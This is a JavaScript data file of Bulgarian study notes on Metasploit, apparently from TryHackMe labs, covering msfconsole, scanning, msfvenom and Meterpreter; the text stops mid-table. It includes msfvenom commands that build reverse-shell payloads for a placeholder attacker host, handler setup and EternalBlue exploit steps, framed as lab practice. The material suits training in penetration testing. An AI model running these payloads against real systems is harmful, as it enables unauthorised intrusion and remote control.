// Допълнителни записи за Metasploit. Командите и примерните терминални изходи са запазени;
 // пояснителният текст е преведен на български.
window.METASPLOIT_ENTRIES = [
  {
    id: "metasploit-overview-intro",
    title: "Metasploit Framework: предназначение и компоненти",
    type: "note",
    topic: "Metasploit",
    sourceName: "TryHackMe",
    createdAt: "25.10.2026",
    content: "Metasploit Framework подпомага етапите на penetration testing — от събиране на информация до post-exploitation. Тук са подредени версиите, компонентите, понятията и категориите модули.",
    blocks: [
      { type: "heading", text: "Какво представлява Metasploit" },
      { type: "paragraph", text: "Metasploit е широко използван framework за експлоатация, който подпомага различните етапи на penetration testing — от събиране на информация до post-exploitation." },
      { type: "table", headers: ["Издание", "Описание"], rows: [
        ["Metasploit Pro", "Комерсиалното издание. Улеснява автоматизацията и управлението на задачи и предлага графичен потребителски интерфейс (GUI)."],
        ["Metasploit Framework", "Изданието с отворен код, което се използва през командния ред и е включено в много Linux дистрибуции за penetration testing."]
      ] },
      { type: "paragraph", text: "Metasploit Framework е набор от инструменти за събиране на информация, сканиране, експлоатация, разработване на exploits и post-exploitation. Освен при penetration testing е полезен и за изследване на уязвимости и разработване на exploits." },
      { type: "heading", text: "Основни компоненти" },
      { type: "table", headers: ["Компонент", "Предназначение"], rows: [
        ["msfconsole", "Основният интерфейс от командния ред към Metasploit Framework."],
        ["Modules", "Малки компоненти за конкретни задачи: exploits, scanners, payloads и други."],
        ["Tools", "Самостоятелни инструменти за изследване на уязвимости, оценяване на сигурността и penetration testing. Примери: msfvenom, pattern_create и pattern_offset. pattern_create и pattern_offset се използват при exploit development."]
      ] },
      { type: "heading", text: "Основни понятия" },
      { type: "table", headers: ["Термин", "Значение"], rows: [
        ["Exploit", "Код, който използва уязвимост в целевата система."],
        ["Vulnerability", "Пропуск в дизайна, кода или логиката, който засяга целевата система. Експлоатацията може да разкрие поверителна информация или да позволи изпълнение на код."],
        ["Payload", "Кодът, който се изпълнява на целевата система, за да постигне желания резултат — например shell, изпълнение на команда или достъп до информация. Exploit използва уязвимостта; payload определя какво ще се изпълни."]
      ] },
      { type: "heading", text: "Категории модули" },
      { type: "table", headers: ["Категория", "Предназначение и примери"], rows: [
        ["Auxiliary", "Поддържащи модули като scanners, crawlers и fuzzers. Поддиректориите включват admin, analyze, client, cloud, crawler, dos, fileformat, fuzzers, gather, parser, scanner, server, sniffer, spoof, sqli и voip."],
        ["Encoders", "Кодират exploit или payload с надеждата signature-based antivirus да не го разпознае. Успехът е ограничен: защитите сравняват файловете с бази от известни заплахи, но могат да извършват и допълнителни проверки."],
        ["Evasion", "Модулите за evasion изрично опитват заобикаляне на antivirus. Encoders не бива да се смятат за пряк опит за evasion."],
        ["Exploits", "Модули за експлоатация, подредени по целева система или платформа — например AIX, Android, BSD, iOS, Linux, macOS, Solaris, Unix и Windows."],
        ["NOPs", "NOP означава No Operation. При Intel x86 инструкцията е 0x90 и не извършва действие за един CPU цикъл. Често се използва като buffer за постигане на предвидим размер на payload."],
        ["Payloads", "Код, който ще се изпълни на целевата система. Примери са отваряне на shell, изпълнение на команда или стартиране на безвредно приложение като calc.exe като proof of concept в отчет."],
        ["Post", "Модули за post-exploitation. Подредени са по платформи като AIX, Android, BSD, Firefox, hardware, Linux, networking, macOS, Solaris и Windows."]
      ] },
      { type: "heading", text: "Видове payloads" },
      { type: "table", headers: ["Вид", "Описание"], rows: [
        ["Adapters", "Обвиват single payload, за да го преобразуват в друг формат. Например payload може да се постави в PowerShell adapter и да се изпълнява като една PowerShell команда."],
        ["Singles", "Самостоятелни payloads, които не изтеглят допълнителен компонент, за да се изпълнят. Примери: добавяне на потребител или стартиране на notepad.exe."],
        ["Stagers", "Създават канал за връзка между Metasploit и целевата система. При staged payload първо се изпраща малък stager, а после той изтегля останалата част — stage. Така първоначалният payload е по-малък."],
        ["Stages", "Останалата част от payload-а, която се изтегля от stager."]
      ] },
      { type: "paragraph", text: "Имената помагат да се различат single (inline) и staged payloads. В generic/shell_reverse_tcp долната черта между shell и reverse показва inline payload. В windows/x64/shell/reverse_tcp наклонената черта показва staged payload." },
      { type: "heading", text: "Exploit ranking" },
      { type: "paragraph", text: "Exploit-ите се оценяват според надеждността. Рейтингът не гарантира резултат: exploit с нисък рейтинг може да работи, а exploit с висок рейтинг може да се провали или дори да срине целевата система." },
      { type: "table", headers: ["Рейтинг", "Описание"], rows: [
        ["Excellent", "Не би трябвало да срине услугата. Типичен пример са SQL injection, CMD execution, RFI и LFI. Обичайните memory corruption exploits не получават този рейтинг без извънредни обстоятелства като WMF Escape."],
        ["Great", "Има default target и автоматично разпознава подходящата цел или използва application-specific return address след проверка на версията."],
        ["Good", "Има default target, който отговаря на обичайния случай за софтуера — например Windows 7 за desktop приложение или Windows Server 2012 за server."],
        ["Normal", "Като цяло е надежден, но зависи от конкретна версия и не може надеждно да я разпознае автоматично."],
        ["Average", "Обикновено е ненадежден или труден за експлоатация."],
        ["Low", "Почти невъзможен за експлоатация или с успеваемост под 50% при обичайни платформи."],
        ["Manual", "Нестабилен или труден за експлоатация и на практика се държи като DoS. Използва се и когато модулът няма практическа стойност без специална конфигурация."]
      ] },
      { type: "image", src: "images/metasploit-exploit-rankings.png", alt: "Таблица с обяснения на Exploit Ranking", caption: "Оригиналната таблица с Exploit Ranking от предоставения материал." },
      { type: "links", items: [
        { label: "Metasploit Framework Wiki — Exploit Ranking", url: "https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking" }
      ] }
    ]
  },
  {
    id: "metasploit-commands-console",
    title: "msfconsole: интерфейс, контекст и търсене",
    type: "command",
    topic: "Metasploit",
    sourceName: "TryHackMe",
    createdAt: "25.10.2026",
    content: "Справка за стартиране на msfconsole, помощта, историята, tab completion, контекста и основните команди за модулите.",
    blocks: [
      { type: "heading", text: "Стартиране на конзолата" },
      { type: "paragraph", text: "Основният интерфейс е Metasploit console. Стартирай го с командата msfconsole от терминал на система, на която е инсталиран Metasploit. Подканата обикновено е msf6 > или msf5 > според версията." },
      { type: "code", language: "Linux Shell", text: ["msfconsole"].join("\n") },
      { type: "paragraph", text: "msfconsole поддържа много Linux команди. Например ls показва файловете в текущата папка, а ping -c 1 8.8.8.8 изпраща една ICMP заявка. Някои функции на обикновения shell не се поддържат — например пренасочването на изхода към файл чрез >." },
      { type: "code", language: "Metasploit Console · Linux", text: [
        "msf6 > ls",
        "[*] exec: ls",
        "Desktop  Downloads  Pictures  Tools",
        "msf6 > ping -c 1 8.8.8.8",
        "[*] exec: ping -c 1 8.8.8.8",
        "1 packets transmitted, 1 received, 0% packet loss",
        "msf6 > help > help.txt",
        "[-] No such command"
      ].join("\n") },
      { type: "heading", text: "Помощ, история и tab completion" },
      { type: "list", items: [
        "Използвай help самостоятелно или с име на команда, например help set, за да видиш синтаксиса и опциите.",
        "history показва командите, въведени по-рано в конзолата.",
        "Натисни Tab след част от команда, например he, за да видиш автоматичните допълнения."
      ] },
      { type: "code", language: "Metasploit Console · Linux", text: [
        "msf6 > help set",
        "Usage: set [option] [value]",
        "Set the given option to value.",
        "Use -g to operate on the global datastore.",
        "",
        "msf6 > history",
        "1  use exploit/multi/http/nostromo_code_exec",
        "2  set lhost 10.10.16.17",
        "3  set rport 80",
        "4  options",
        "5  run"
      ].join("\n") },
      { type: "heading", text: "Контекст на модул" },
      { type: "paragraph", text: "msfconsole работи с контекст. След избиране на модул prompt-ът показва текущия контекст. Параметрите обикновено принадлежат към избрания модул и може да се наложи да ги зададеш отново след смяна на модул. Това не означава, че си влязъл в папка на операционната система — поддържаните shell команди продължават да са достъпни." },
      { type: "code", language: "Metasploit Console · Linux", text: [
        "msf6 > use exploit/windows/smb/ms17_010_eternalblue",
        "[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp",
        "msf6 exploit(windows/smb/ms17_010_eternalblue) >"
      ].join("\n") },
      { type: "heading", text: "Основни команди за работа с модули" },
      { type: "table", headers: ["Команда", "Предназначение"], rows: [
        ["use <module>", "Избира модул по пълния му път или по номер от резултатите на search."],
        ["show options", "Показва опциите и текущите им стойности за избрания модул."],
        ["show payloads", "Показва payloads, съвместими с избрания exploit."],
        ["show <type>", "От основния prompt показва модулите от тип като auxiliary, payload или exploit."],
        ["info", "Показва информация за модул — автор, платформа, опции, описание и препратки. Може да се използва и с път до модул."],
        ["search <term>", "Търси модули по CVE, exploit име или целева система."],
        ["back", "Излиза от текущия модулен контекст."]
      ] },
      { type: "code", language: "Metasploit Console · Linux", text: [
        "msf6 > search ms17-010",
        "Matching Modules",
        "0  auxiliary/admin/smb/ms17_010_command",
        "1  auxiliary/scanner/smb/smb_ms17_010",
        "2  exploit/windows/smb/ms17_010_eternalblue",
        "3  exploit/windows/smb/ms17_010_psexec",
        "",
        "msf6 > search type:auxiliary telnet",
        "Matching Modules",
        "0  auxiliary/scanner/telnet/telnet_login",
        "1  auxiliary/scanner/telnet/telnet_version"
      ].join("\n") },
      { type: "paragraph", text: "Резултатите от search показват типа и категорията на модула, както и неговия rank. Филтри като type и platform ограничават търсенето. Значението на Exploit Ranking е описано в раздела Представлява." },
      { type: "links", items: [
        { label: "Metasploit Framework Wiki — Exploit Ranking", url: "https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking" }
      ] }
    ]
  },
  {
    id: "metasploit-commands-options-sessions",
    title: "Параметри, изпълнение на модули и сесии",
    type: "command",
    topic: "Metasploit",
    sourceName: "TryHackMe",
    createdAt: "25.10.2026",
    content: "Команди set, unset, setg, run, exploit, check, background и sessions; типове prompt и значения на основните параметри.",
    blocks: [
      { type: "heading", text: "Видове prompt" },
      { type: "table", headers: ["Prompt", "Значение"], rows: [
        ["root@host:~#", "Обикновен prompt на операционната система. Metasploit командите не се изпълняват тук."],
        ["msf6 >", "Основният prompt на msfconsole без избран модул."],
        ["msf6 exploit(...) >", "Контекст на модул. Тук се задават module options и се изпълняват команди за модула."],
        ["meterpreter >", "Prompt на Meterpreter след установяване на Meterpreter сесия."],
        ["C:\\Windows\\system32>", "Обикновен shell на целевата Windows система. Командите се изпълняват на целта."]
      ] },
      { type: "heading", text: "Задаване на параметри" },
      { type: "paragraph", text: "Синтаксисът за задаване на параметри е set PARAMETER_NAME VALUE. Използвай show options, за да провериш задължителните полета и текущите им стойности. Предварително зададена стойност — например RPORT 80 — може да не съвпада с порта на конкретното приложение." },
      { type: "code", language: "Metasploit Console · Linux", text: [
        "set PARAMETER_NAME VALUE",
        "set rhosts 10.10.165.39",
        "show options",
        "unset RHOSTS",
        "unset all",
        "setg rhosts 10.10.165.39",
        "unsetg rhosts"
      ].join("\n") },
      { type: "table", headers: ["Параметър", "Значение"], rows: [
        ["RHOSTS", "IP адрес на целта, мрежа, CIDR диапазон или файл с target адреси — по един на ред — подаден чрез file:/path/to/targets.txt."],
        ["RPORT", "Remote port — портът на целевата система, на който работи услугата."],
        ["PAYLOAD", "Payload, който ще се използва с exploit-а."],
        ["LHOST", "IP адрес или интерфейс на локалната тестова машина, например Kali."],
        ["LPORT", "Local port на машината, която приема reverse shell връзката."],
        ["SESSION", "ID на съществуваща връзка към целта; използва се от post-exploitation модул."]
      ] },
      { type: "paragraph", text: "set задава стойност в текущия контекст. При преминаване към друг модул може да се наложи да я въведеш отново. unset изчиства една стойност, а unset all — всички стойности в контекста. setg задава глобална стойност за различни модули, докато не излезеш от Metasploit или не я премахнеш с unsetg." },
      { type: "image", src: "images/metasploit-target-file-rhosts.png", alt: "Файл със списък target IP адреси и RHOSTS, зададен с file: път", caption: "Пример за списък с цели и използване на file:/root/Desktop/targets.txt като стойност на RHOSTS." },
      { type: "heading", text: "Стартиране и проверка на модул" },
      { type: "list", items: [
        "run и exploit стартират модула. run е alias на exploit и е удобен за скенери и други модули, които не са exploits.",
        "exploit -z стартира exploit-а и поставя сесията във фонов режим веднага щом се отвори.",
        "check проверява дали целта изглежда уязвима, без да изпълнява exploit-а; наличен е само при някои модули.",
        "back излиза от текущия модулен контекст."
      ] },
      { type: "code", language: "Metasploit Console · Linux", text: [
        "msf6 > use exploit/windows/smb/ms17_010_eternalblue",
        "msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.165.39",
        "rhosts => 10.10.165.39",
        "msf6 exploit(windows/smb/ms17_010_eternalblue) > show options",
        "msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z",
        "[*] Session created in the background.",
        "msf6 exploit(windows/smb/ms17_010_eternalblue) > back",
        "msf6 >"
      ].join("\n") },
      { type: "paragraph", text: "EternalBlue е пример за exploit срещу уязвим SMBv1 service на Windows. Материалът предупреждава, че exploit-ът може да причини нестабилност, срив или рестартиране на целта. Използвай го само върху предоставена лабораторна машина или друга изрично разрешена система." },
      { type: "heading", text: "Управление на сесии" },
      { type: "paragraph", text: "Session е комуникационен канал, установен към целевата система. Остави го във фонов режим, за да се върнеш към msfconsole или да работиш с друга цел." },
      { type: "table", headers: ["Команда", "Действие"], rows: [
        ["background", "Премества текущата сесия във фонов режим."],
        ["CTRL+Z", "Алтернативен начин за background на сесия."],
        ["sessions", "Показва активните сесии от msfconsole или модулен контекст."],
        ["sessions -i <ID>", "Отваря интерактивния prompt на избраната сесия."],
        ["sessions -h", "Показва опциите за преглед, взаимодействие, преименуване, приключване и изпълнение на команди в сесии."]
      ] },
      { type: "code", language: "Metasploit Console · Linux", text: [
        "meterpreter > background",
        "[*] Backgrounding session 2...",
        "msf6 > sessions",
        "Active sessions",
        "Id  Type                     Information",
        "1   meterpreter x64/windows  NT AUTHORITY\\SYSTEM @ JON-PC",
        "2   meterpreter x64/windows  NT AUTHORITY\\SYSTEM @ JON-PC",
        "",
        "msf6 > sessions -i 2",
        "[*] Starting interaction with 2...",
        "meterpreter >"
      ].join("\n") },
      { type: "code", language: "Windows Shell", text: ["C:\\Windows\\system32>"].join("\n") }
    ]
  },
  {
    id: "metasploit-commands-scanning-database",
    title: "Сканиране, услуги и база данни",
    type: "command",
    topic: "Metasploit",
    sourceName: "TryHackMe",
    createdAt: "25.10.2026",
    content: "Справка за port scanning, UDP и SMB discovery, NetBIOS, PostgreSQL, workspaces и записване на резултатите в Metasploit database.",
    blocks: [
      { type: "heading", text: "Port scanning" },
      { type: "paragraph", text: "Metasploit разполага с модули за откриване на отворени портове. Потърси ги чрез search portscan. При необходимост от по-бърз port scan Metasploit може да не е първият избор, но модулите му са полезни в етапите на scanning и fingerprinting." },
      { type: "code", language: "Metasploit Console · Linux", text: [
        "msf6 > search portscan",
        "auxiliary/scanner/portscan/ack",
        "auxiliary/scanner/portscan/ftpbounce",
        "auxiliary/scanner/portscan/syn",
        "auxiliary/scanner/portscan/tcp",
        "auxiliary/scanner/portscan/xmas",
        "",
        "msf6 auxiliary(scanner/portscan/tcp) > show options",
        "CONCURRENCY  10       Concurrent ports per host",
        "DELAY        0        Delay between connections",
        "PORTS        1-10000  Ports to scan",
        "RHOSTS                Target host(s)",
        "THREADS      1        Concurrent threads",
        "TIMEOUT      1000     Socket connect timeout",
        "",
        "msf6 > nmap -sS 10.10.12.229"
      ].join("\n") },
      { type: "paragraph", text: "От msfconsole могат да се изпълняват повечето Linux команди, включително Nmap. Nmap може да е по-подходящ, когато приоритет е скоростта на сканиране." },
      { type: "heading", text: "UDP, SMB и NetBIOS" },
      { type: "paragraph", text: "auxiliary/scanner/discovery/udp_sweep изпраща ограничен набор probes и може бързо да открие услуги като DNS или NetBIOS; това не е изчерпателно сканиране на всички UDP услуги. За SMB са полезни smb_version и smb_enumshares. Провери кои scanner модули са налични в твоята версия." },
      { type: "code", language: "Metasploit Console · Linux", text: [
        "msf6 > use auxiliary/scanner/discovery/udp_sweep",
        "msf6 auxiliary(scanner/discovery/udp_sweep) > run",
        "[*] Sending 13 probes to 10.10.12.229 (1 host)",
        "[*] Discovered NetBIOS on 10.10.12.229:137",
        "[*] Auxiliary module execution completed",
        "",
        "msf6 > use auxiliary/scanner/smb/smb_version",
        "msf6 auxiliary(scanner/smb/smb_version) > run",
        "[+] 10.10.12.229:445 - Host is running Windows 7 Professional SP1",
        "[*] Auxiliary module execution completed"
      ].join("\n") },
      { type: "paragraph", text: "Не пропускай по-рядко срещани услуги като NetBIOS. Името на системата може да подскаже нейната роля. Провери и дали споделени файлове или папки са достъпни без парола или със слаба парола. За VNC може да потърсиш auxiliary/scanner/vnc/; модулът vnc_login проверява VNC authentication и отчита успешните влизания." },
      { type: "heading", text: "Metasploit database и workspaces" },
      { type: "paragraph", text: "Базата данни улеснява управлението на engagement с няколко target-а и пази резултатите от сканирането. При инсталация без настроена база стартирай PostgreSQL и инициализирай базата като postgres. msfdb init като root връща съобщение да се използва непривилегирован потребител. Изтрий съществуваща база само ако целта е да я пресъздадеш." },
      { type: "code", language: "Linux Shell", text: [
        "systemctl start postgresql",
        "sudo -u postgres msfdb init",
        "",
        "# За лабораторна база, която трябва да се пресъздаде:",
        "sudo -u postgres msfdb delete"
      ].join("\n") },
      { type: "code", language: "Metasploit Console · Linux", text: [
        "msf6 > db_status",
        "[*] Connected to msf. Connection type: postgresql.",
        "",
        "msf6 > workspace",
        "* default",
        "",
        "msf6 > workspace -a tryhackme",
        "[*] Added workspace: tryhackme",
        "* tryhackme",
        "",
        "msf6 > workspace default",
        "[*] Workspace: default"
      ].join("\n") },
      { type: "paragraph", text: "Workspaces разделят данните на отделни проекти. workspace изброява наличните; workspace -a <name> създава, workspace -d <name> изтрива, а workspace <name> превключва към избраното. Използвай workspace -h за помощ." },
      { type: "table", headers: ["Database команда", "Предназначение"], rows: [
        ["db_status", "Показва състоянието на връзката към базата."],
        ["db_nmap", "Изпълнява Nmap и записва резултата автоматично."],
        ["hosts / services", "Показват host-овете и услугите, записани в базата."],
        ["vulns / loot / notes", "Показват уязвимости, събрани файлове и бележки."],
        ["db_import / db_export", "Импортират резултат от сканиране или експортират съдържанието на базата."],
        ["db_connect / db_disconnect", "Свързват се към или прекъсват връзка с data service."]
      ] },
      { type: "paragraph", text: "След db_nmap използвай hosts и services, за да прегледаш събраните данни. hosts -R добавя записаните host-ове към RHOSTS. services -S netbios търси конкретна услуга. Типичен workflow е откриване на host-ове, сканиране на услугите им, задаване на RHOSTS и изпълнение на съответния scanner." },
      { type: "code", language: "Metasploit Console · Linux", text: [
        "msf6 > db_nmap -sV -p- 10.10.12.229",
        "msf6 > hosts",
        "msf6 > services",
        "msf6 > use auxiliary/scanner/smb/smb_ms17_010",
        "msf6 auxiliary(scanner/smb/smb_ms17_010) > hosts -R",
        "RHOSTS => 10.10.12.229",
        "msf6 auxiliary(scanner/smb/smb_ms17_010) > show options",
        "msf6 auxiliary(scanner/smb/smb_ms17_010) > run",
        "",
        "msf6 > services -S netbios"
      ].join("\n") },
      { type: "heading", text: "Бележки за reconnaissance" },
      { type: "list", items: [
        "HTTP може да разкрива web application уязвимости, например SQL injection или RCE.",
        "FTP може да позволява anonymous login.",
        "SMB може да е уязвим към exploit-и като MS17-010.",
        "SSH може да използва слаби или default credentials.",
        "RDP може да е уязвим към BlueKeep или да е достъпен със слаби credentials.",
        "По-доброто scanning и fingerprinting обикновено дават повече подходящи Metasploit модули."
      ] }
    ]
  },
  {
    id: "metasploit-commands-msfvenom",
    title: "msfvenom, payload formats и handlers",
    type: "command",
    topic: "Metasploit",
    sourceName: "TryHackMe",
    createdAt: "25.10.2026",
    content: "Справка за msfvenom, payload formats, encoders, PHP лабораторен пример и Multi Handler.",
    blocks: [
      { type: "heading", text: "msfvenom" },
      { type: "paragraph", text: "msfvenom замени msfpayload и msfencode. Той дава достъп до payloads в Metasploit Framework и може да ги генерира в различни формати — PHP, EXE, DLL, ELF и други — за платформи като Windows, Linux, Android и Apple. msfvenom -l payloads изброява payloads, а msfvenom --list formats показва поддържаните output formats." },
      { type: "code", language: "Linux Shell", text: [
        "msfvenom -l payloads",
        "msfvenom --list formats"
      ].join("\n") },
      { type: "heading", text: "Encoders" },
      { type: "paragraph", text: "Encoder кодира payload-а; целта му не е непременно да заобикаля antivirus. Кодирането може да повлияе на някои antivirus продукти, но не гарантира заобикаляне на защитата. В примера се използва php/base64 encoder и raw output format." },
      { type: "code", language: "Linux Shell", text: ["msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.X.X -f raw -e php/base64"].join("\n") },
      { type: "heading", text: "Примери за payload formats" },
      { type: "paragraph", text: "LHOST е адресът на машината, която слуша за връзка, а LPORT е портът на handler-а. ELF е Linux изпълним формат, сравним с EXE в Windows. На лабораторната машина може да е необходимо да зададеш изпълними права с chmod +x преди стартиране." },
      { type: "code", language: "Linux Shell", text: [
        "# Linux ELF",
        "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf",
        "chmod +x rev_shell.elf",
        "",
        "# Windows EXE",
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe",
        "",
        "# PHP",
        "msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php",
        "",
        "# ASP",
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp",
        "",
        "# Python",
        "msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py"
      ].join("\n") },
      { type: "heading", text: "PHP файл в лабораторния пример" },
      { type: "paragraph", text: "В предоставения пример суровият PHP output няма начален PHP tag и затварящ tag. Учебният материал показва редактиране на reverse_shell.php: прегледай генерирания файл, добави необходимия начален <?php tag и затварящ ?> tag според указанията за лабораторията." },
      { type: "image", src: "images/metasploit-php-comment-tag.png", alt: "Коментиран PHP opening tag във файл reverse_shell.php", caption: "Откъс от редактиране на PHP файла в лабораторната задача." },
      { type: "image", src: "images/metasploit-php-open-tag.png", alt: "Началният PHP tag е добавен в GNU nano", caption: "Пример за добавяне на <?php в началото на файла." },
      { type: "image", src: "images/metasploit-php-close-tag.png", alt: "Затварящ PHP tag в края на файла", caption: "Пример за затварящ ?> tag в края на файла." },
      { type: "heading", text: "Multi Handler" },
      { type: "paragraph", text: "Reverse payload изисква handler, който приема входящата връзка. При използване на exploit module тази част обикновено се управлява автоматично. Самостоятелно може да се използва exploit/multi/handler — поддържа Meterpreter и обикновени shells." },
      { type: "list", items: [
        "Избери exploit/multi/handler.",
        "Задай същия PAYLOAD, LHOST и LPORT, използвани при генерирането на payload.",
        "Стартирай handler-а с run и го остави да чака входящата връзка."
      ] },
      { type: "code", language: "Metasploit Console · Linux", text: [
        "msf6 > use exploit/multi/handler",
        "msf6 exploit(multi/handler) > set payload php/reverse_php",
        "msf6 exploit(multi/handler) > set lhost 10.0.2.19",
        "msf6 exploit(multi/handler) > set lport 7777",
        "msf6 exploit(multi/handler) > show options",
        "msf6 exploit(multi/handler) > run",
        "[*] Started reverse TCP handler on 10.0.2.19:7777"
      ].join("\n") },
      { type: "paragraph", text: "Когато payload-ът бъде задействан, Multi Handler приема връзката и предоставя shell. При Meterpreter payload се отваря Meterpreter сесия. Reverse payloads изискват handler с подходящите PAYLOAD, LHOST и LPORT. Примерите са от учебната среда и се използват само върху системи с изрично разрешение." },
      { type: "heading", text: "Проверки при избор на payload" },
      { type: "list", items: [
        "Използвай show payloads, за да видиш payloads, съвместими с избрания exploit.",
        "След set payload изпълни отново show options — payload-ът може да добави задължителни параметри.",
        "Изборът може да изисква проби заради ограничения на операционната система, firewall, antivirus, файловите права или липсващ interpreter.",
        "Примерите от материала обхващат Linux ELF, Windows EXE, PHP, ASP и Python."
      ] }
    ]
  },
  {
    id: "metasploit-meterpreter-overview",
    title: "Meterpreter: предназначение и начин на работа",
    type: "note",
    topic: "Metasploit",
    section: "meterpreter",
    sourceName: "TryHackMe",
    url: "https://tryhackme.com/room/meterpreter",
    createdAt: "26.10.2026",
    content: "Обяснение какво представлява Meterpreter, как работи в паметта на целевата система, как се различават версиите му и как се избира подходящ payload.",
    blocks: [
      { type: "heading", text: "Какво представлява Meterpreter" },
      { type: "paragraph", text: "Meterpreter е payload на Metasploit, който подпомага penetration testing с различни инструменти. Той работи на целевата система като агент в архитектура тип command and control (C2). Чрез него може да се взаимодейства с операционната система и файловете, както и да се използват специализираните му команди." },
      { type: "heading", text: "Как работи" },
      { type: "paragraph", text: "Обикновено Meterpreter не се инсталира като обикновена програма и не записва самостоятелен Meterpreter файл на диска. Той работи в RAM като процес. Това може да намали следите от отделен payload файл, но не го прави невидим: антивирусният софтуер може да разпознава Meterpreter, а процесът и поведението му могат да бъдат анализирани." },
      { type: "paragraph", text: "Комуникацията с Metasploit може да използва криптиран TLS канал. Ако мрежовите защитни системи не декриптират трафика, те имат по-малко видимост върху съдържанието му; криптирането само по себе си не гарантира, че дейността няма да бъде открита." },
      { type: "heading", text: "Процесът, в който работи Meterpreter" },
      { type: "paragraph", text: "Meterpreter може да работи вътре в съществуващ процес, затова името на процеса не е задължително да е meterpreter.exe. В примерния изход getpid връща PID 1304, а ps показва, че този PID принадлежи на spoolsv.exe. PID (Process Identifier) е уникалният идентификатор, с който операционната система обозначава работещ процес." },
      { type: "code", language: "Meterpreter · Windows", text: [
        "meterpreter > getpid",
        "Current pid: 1304",
        "",
        "meterpreter > ps",
        "PID   PPID  Name        Arch  User                Path",
        "1304  692   spoolsv.exe x64   NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\spoolsv.exe",
        "",
        "C:\\Windows\\system32> tasklist /m /fi \"pid eq 1304\"",
        "Image Name   PID   Modules",
        "spoolsv.exe  1304  ntdll.dll, kernel32.dll, ..."
      ].join("\n") },
      { type: "paragraph", text: "При проверка на заредените DLLs в този пример не се вижда файл с име meterpreter.dll. Това и името на процеса сами по себе си не доказват дали процесът е легитимен или компрометиран." },
      { type: "heading", text: "Inline и staged варианти" },
      { type: "paragraph", text: "Meterpreter payloads се предлагат като inline (single) и staged варианти. При staged payload първо се изпраща по-малък stager, който установява канал и получава останалата част — stage. При inline payload целият payload се изпраща наведнъж." },
      { type: "table", headers: ["Пример", "Вариант"], rows: [
        ["generic/shell_reverse_tcp", "Inline / single: долната черта между shell и reverse показва един payload."],
        ["windows/x64/shell/reverse_tcp", "Staged: наклонената черта между shell и reverse показва отделни stager и stage компоненти."]
      ] },
      { type: "heading", text: "Налични версии и избор" },
      { type: "paragraph", text: "Meterpreter има варианти за Android, Apple iOS, Java, Linux, macOS, PHP, Python и Windows. Списъкът може да се филтрира чрез msfvenom. Избраният payload зависи от платформата и архитектурата на целта, наличните компоненти (например Python или PHP), възможните мрежови връзки — raw TCP, HTTPS или IPv6 — и съвместимостта с избрания exploit." },
      { type: "code", language: "Linux Shell", text: [
        "msfvenom --list payloads | grep meterpreter"
      ].join("\n") },
      { type: "paragraph", text: "Когато Meterpreter се използва чрез exploit module, изборът може да е ограничен до съвместимите payloads. Например MS17-010 EternalBlue може да избере windows/x64/meterpreter/reverse_tcp по подразбиране. Съвместимите варианти се виждат с show payloads." },
      { type: "code", language: "Metasploit Console · Linux", text: [
        "msf6 > use exploit/windows/smb/ms17_010_eternalblue",
        "[*] Using configured payload windows/x64/meterpreter/reverse_tcp",
        "msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads"
      ].join("\n") },
      { type: "heading", text: "Групи инструменти" },
      { type: "list", items: [
        "Built-in commands — основните команди, включени в Meterpreter.",
        "Meterpreter tools — допълнителни инструменти, налични според конкретната версия.",
        "Meterpreter scripting — възможности за изпълнение на скриптове. Командите и категориите се различават според платформата и заредените extensions."
      ] },
      { type: "paragraph", text: "Командите може да са групирани като Core, File system, Networking, System, User interface, Webcam, Audio output, Elevate, Password database и Timestomp. Провери help в конкретната сесия, защото наличните функции зависят от версията, платформата и средата." },
      { type: "heading", text: "Свързани материали" },
      { type: "links", items: [
        { label: "Introduction to Metasploit", url: "https://www.tryhackme.com/jr/metasploitintro" },
        { label: "Scanning and Exploitation with Metasploit", url: "https://www.tryhackme.com/jr/metasploitexploitation" }
      ] }
    ]
  },
  {
    id: "metasploit-commands-meterpreter",
    title: "Meterpreter: команди и работа със сесии",
    type: "command",
    topic: "Metasploit",
    section: "meterpreter",
    sourceName: "TryHackMe",
    url: "https://tryhackme.com/room/meterpreter",
    createdAt: "26.10.2026",
    content: "Справка за основните Meterpreter команди, управление на сесии, работа с файлове, процеси и допълнителни extensions.",
    blocks: [
      { type: "heading", text: "Покажи наличните команди" },
      { type: "paragraph", text: "Изпълни help в Meterpreter prompt, за да видиш командите и категориите, налични в текущата сесия. Различните Meterpreter варианти предлагат различен набор от команди." },
      { type: "code", language: "Meterpreter · Windows", text: [
        "meterpreter > help",
        "Core Commands",
        "=============",
        "?          Help menu",
        "background Backgrounds the current session",
        "exit       Terminate the Meterpreter session",
        "getpid     Shows the current process identifier",
        "getuid     Shows the user that Meterpreter is running as",
        "load       Loads one or more Meterpreter extensions",
        "migrate    Moves Meterpreter to another process",
        "sessions   Quickly switch to another session"
      ].join("\n") },
      { type: "heading", text: "Основни команди" },
      { type: "table", headers: ["Команда", "Предназначение"], rows: [
        ["background / bg", "Поставя текущата Meterpreter сесия във фонов режим."],
        ["exit", "Затваря текущата Meterpreter сесия."],
        ["guid", "Показва GUID (Globally Unique Identifier) на сесията."],
        ["help", "Показва наличните команди."],
        ["info", "Показва информация за Post module."],
        ["irb", "Отваря интерактивна Ruby конзола за текущата сесия."],
        ["load", "Зарежда Meterpreter extension."],
        ["migrate <PID>", "Премества Meterpreter към друг процес."],
        ["run", "Изпълнява Meterpreter script или Post module."],
        ["sessions", "Изброява сесиите или позволява превключване към друга."]
      ] },
      { type: "heading", text: "Файлова система, мрежа и система" },
      { type: "table", headers: ["Категория", "Команди и предназначение"], rows: [
